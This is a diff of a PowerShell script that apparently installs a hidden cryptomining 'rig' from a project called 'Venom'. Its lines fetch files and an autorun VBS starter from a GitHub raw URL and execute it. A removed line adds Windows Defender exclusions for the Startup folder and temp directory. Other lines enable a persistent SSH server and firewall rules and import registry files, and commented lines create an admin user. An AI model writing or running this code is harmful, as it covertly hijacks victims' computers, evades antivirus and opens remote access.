@@ -26,9 +26,7 @@ $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
 
-powershell powershell.exe -ep bypass ./RunHidden
 
 # create admin user
 #$NewLocalAdmin = ".Venom"
@@ -53,6 +51,9 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs
 #Download modified config.json
 Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"
 
+#Download Autorun starter
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs -OutFile "RunHidden.vbs"
+
 # enabling  persistent ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
@@ -61,6 +62,9 @@ Get-NetFirewallRule -Name *ssh*
 
 #install the registry
 ./wrev.reg; ./calty
+
+./RunHidden
+
 
 #Create rig Folder within Folder
 New-Item -Name "$wd" -Path "$path" -ItemType Directory
